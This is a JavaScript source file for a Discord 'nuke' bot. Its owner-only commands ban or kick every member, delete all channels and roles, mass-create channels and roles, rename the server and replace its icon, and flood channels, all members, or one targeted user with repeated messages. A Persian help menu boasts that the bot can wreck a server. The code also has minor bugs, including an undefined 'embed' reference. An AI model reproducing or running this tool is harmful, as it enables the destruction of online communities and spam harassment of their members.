const fs = require('fs');
const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');
const token = config.token;
const prefix = config.prefix;
const allowedUserId = config.allowedUserId;
 


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  client.user.setActivity('With Your Server');
});

client.on('message', async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'ba') {
    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    message.guild.members.cache.forEach((member) => {
      if (member.bannable) {
        member.ban();
      }
    });

    console.log('All members have been banned.');
  }

  if (command === 'ka') {
    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    message.guild.members.cache.forEach((member) => {
      if (member.kickable) {
        member.kick();
      }
    });

    console.log('All members have been kicked.');
  }

  if (command === 'cn') {
    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    const channelCount = parseInt(args[0]);
    const channelName = args.slice(1).join(' ');

    if (isNaN(channelCount) || channelCount <= 0 || !channelName) {
      console.log('Invalid command usage. Please provide a valid number of channels to create and a channel name.');
      return;
    }


    for (let i = 0; i < channelCount; i++) {
      message.guild.channels.create(channelName, { type: 'text' })
        .then((channel) => console.log(`Channel "${channel.name}" created.`))
        .catch((error) => console.error(error));
    }

    console.log(`${channelCount} channels with the name "${channelName}" have been created.`);
  }

  if (command === 'da') {

    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }


    message.guild.channels.cache.forEach(async (channel) => {
      try {
        await channel.delete();
        console.log(`Channel "${channel.name}" deleted.`);
      } catch (error) {
        console.error(`Error deleting channel "${channel.name}": ${error.message}`);
      }
    });

    console.log('All channels have been deleted.');
  }

  if (command === 'ma') {

    if (message.author.id !== allowedUserId) {
        console.log('You do not have permission to use this command.');
        return;
    }

   
    const numMessages = parseInt(args[0]);

 
    if (isNaN(numMessages) || numMessages <= 0) {
        console.log('Please provide a valid number of messages to send.');
        return;
    }

    const messageContent = args.slice(1).join(' ');


    if (!messageContent) {
        console.log('Please provide a message to send to all members.');
        return;
    }


    message.guild.members.cache.forEach(async (member) => {
        for (let i = 0; i < numMessages; i++) {
            try {
                await member.send(messageContent);
                console.log(`Message sent to ${member.user.tag}: ${messageContent}`);
            } catch (error) {
                console.error(`Error sending message to ${member.user.tag}: ${error.message}`);
            }
        }
    });

    console.log(`Sent ${numMessages} messages to each member.`);
}

  if (command === 'dr') {

    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

  
    message.guild.roles.cache.forEach(async (role) => {
      try {
        await role.delete();
        console.log(`Role "${role.name}" deleted.`);
      } catch (error) {
        console.error(`Error deleting role "${role.name}": ${error.message}`);
      }
    });

    console.log('All roles have been deleted.');
  }

  if (command === 'cr') {

    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    const roleCount = parseInt(args[0]);
    const roleName = args.slice(1).join(' ');


    if (isNaN(roleCount) || roleCount <= 0 || !roleName) {
      console.log('Invalid command usage. Please provide a valid number of roles to create and a role name.');
      return;
    }


    for (let i = 0; i < roleCount; i++) {
      message.guild.roles.create({
        data: {
          name: roleName,
          color: 'RANDOM', 
        },
        reason: 'Role creation requested by command',
      })
        .then((role) => console.log(`Role "${role.name}" created.`))
        .catch((error) => console.error(`Error creating role "${roleName}": ${error.message}`));
    }

    console.log(`${roleCount} roles with the name "${roleName}" have been created.`);
  }

  if (command === 'ce') {

    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    const newName = args.join(' ');

 
    if (!newName) {
      console.log('Please provide a new name for the server.');
      return;
    }

  
    try {
      await message.guild.setName(newName);
      console.log(`Server name changed to "${newName}".`);
      console.log(`Server name changed to "${newName}".`);
    } catch (error) {
      console.error(`Error changing server name: ${error.message}`);
      console.log('An error occurred while changing the server name.');
    }
  }

  if (command === 'cp') {

    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    const newProfile = args.join(' ');

    if (!newProfile) {
      console.log('Please provide a new profile for the bot.');
      return;
    }

    try {
      await message.guild.setIcon(newProfile);
      console.log(`Server profile changed.`);
      console.log('Server profile changed.');
    } catch (error) {
      console.error(`Error changing Server profile: ${error.message}`);
      console.log('An error occurred while changing the Server profile.');
    }
  }

 

  if (command === 'sc') {
    if (message.author.id !== allowedUserId) {
      console.log('You do not have permission to use this command.');
      return;
    }

    const messageCount = parseInt(args[0]);
    const messageContent = args.slice(1).join(' ');

    if (isNaN(messageCount) || messageCount <= 0 || !messageContent) {
      console.log('Invalid command usage. Please provide a valid number of messages to send and a message content.');
      return;
    }

    message.guild.channels.cache.forEach(async (channel) => {
      if (channel.type === 'text') {
        for (let i = 0; i < messageCount; i++) {
          try {
            await channel.send(messageContent);
            console.log(`Message sent to ${channel.name}: ${messageContent}`);
          } catch (error) {
            console.error(`Error sending message to ${channel.name}: ${error.message}`);
          }
        }
      }
    });

    console.log(`Message sent to all channels: ${messageContent}`);
  }



  const targetedUsers = [];

  if (command === 'mu') {
      if (message.author.id !== allowedUserId) {
          console.log('You do not have permission to use this command.');
          return;
      }

      const targetUserId = args[0];
      const numMessages = parseInt(args[1]);

      if (!targetUserId || isNaN(numMessages) || numMessages <= 0) {
          console.log('Please provide a valid user ID and a valid number of messages.');
          return;
      }

      const targetUser = message.guild.members.cache.get(targetUserId);

      if (!targetUser) {
          console.log('Invalid user ID. User not found.');
          return;
      }

      const messageContent = args.slice(2).join(' ');

      if (!messageContent) {
          console.log('Please provide a message to send to the target user.');
          return;
      }


      for (let i = 0; i < numMessages; i++) {
          try {
              await targetUser.send(messageContent);
              console.log(`Message sent to ${targetUser.user.tag}: ${messageContent}`);
              targetedUsers.push(targetUser.user.tag);
          } catch (error) {
              console.error(`Error sending message to ${targetUser.user.tag}: ${error.message}`);
          }
      }

      console.log(`Sent ${numMessages} messages to ${targetUser.user.tag}.`);
  }



  if (command === 'sr') {
    if (message.author.id !== allowedUserId) {
        console.log('You do not have permission to use this command.');
        return;
    }

    const channelMention = args[0];
    const numMessages = parseInt(args[1]);

    if (!channelMention || isNaN(numMessages) || numMessages <= 0) {
        console.log('Please provide a valid channel mention and a valid number of messages.');
        return;
    }

    const targetChannelId = channelMention.replace(/<#|>/g, ''); 
    const targetChannel = message.guild.channels.cache.get(targetChannelId);

    if (!targetChannel || targetChannel.type !== 'text') {
        console.log('Invalid channel mention. Text channel not found.');
        return;
    }

    const messageContent = args.slice(2).join(' ');

    if (!messageContent) {
        console.log('Please provide a message to send to the target channel.');
        return;
    }

    try {
        Promise.all(Array.from({ length: numMessages }, () => targetChannel.send(messageContent)));
        console.log(`Sent ${numMessages} messages to ${targetChannel.name}.`);
    } catch (error) {
        console.error(`Error sending messages to ${targetChannel.name}: ${error.message}`);
    }
}
  
  if (command === 'help') {
    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('سلام اسم من شروین اتکره ! من میتونم برینم به سرورت')
      .setColor(0x00ff00)
      .addField('!cn [تعداد] [اسم]', 'چنل میسازم هر تعداد بگی و به هر اسمی', false)
      .addField('!da', 'تمام چنل های داخل سرورو پاک میکنم', false)
      .addField('!ba', 'تمام ممبر های داخل سرورو بن میکنم', false)
      .addField('!ka', 'تمام ممبر های داخل سرورو کیک میکنم', false)
      .addField('!ma [تعداد] [پیام]', 'به همه ی اعضای سرور هر پیامی بخوای میدم', false)
      .addField('!dr', 'تمامی رول های سرورو پاک میکنم', false)
      .addField('!cr [تعداد] [اسم]', 'هر تعداد رول بگی به اسم دلخواه میسازم', false)
      .addField('!ce [اسم]', 'میتونم اسم سرورو عوض کنم', false)
      .addField('!cp [لینک پروف]', 'پروف سرورو میتونم عوض کنم', false)
      .addField('!sc [تعداد] [پیام]', 'میتونم داخل همه ی چنلا اسپم کنم', false)
      .addField('!mu [یوزر آیدی] [تعداد] [پیام]', 'میتونم به یک کاربر مشخص به هر تعدادی که بگی پیام بدم', false)
      .addField('!sr [چنل آیدی] [تعداد] [پیام]', 'میتونم تو هر چنلی که دوست داشتی به تعداد مشخص پیام بدم', false);
      embed.setFooter("By mr_pootatooo");

    message.channel.send(helpEmbed);
  }
});


client.login(token);
